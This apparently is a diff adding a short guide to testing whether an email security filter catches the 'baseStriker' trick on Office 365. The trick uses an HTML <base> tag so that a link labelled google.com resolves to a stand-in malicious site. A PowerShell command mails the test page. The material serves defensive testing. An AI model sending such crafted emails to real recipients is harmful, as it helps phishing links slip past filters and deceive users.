@@ -1,0 +1,18 @@
+As of 2018-05-14, Microsoft Office 365 email is vulnerable to the baseStriker attack. You can use the htm file and script below to test this if your email security solution is able to turn base tags into safelinks.
+
+Create the following files in the same folder and run the baseStriker_test.ps1 PowerShell script.
+
+baseStriker_Test.htm
+ <html>
+ <head>
+      <base href="https://www.malicioussite.com/">
+ </head>
+ <body>
+ Base Link: <a href="attack">https:/www.google.com/</a><br>
+ Normal Link: <a href="https://www.malicioussite.com/attack">https:/www.google.com/</a>
+ </body>
+ </html>
+
+baseStriker_test.ps1
+ [String]$body = gc "baseStriker_Test.htm" 
+ Send-MailMessage -SmtpServer <smtp_server> -From <from_address> -To <to_address> -Subject "baseStriker Test" -Body $body 
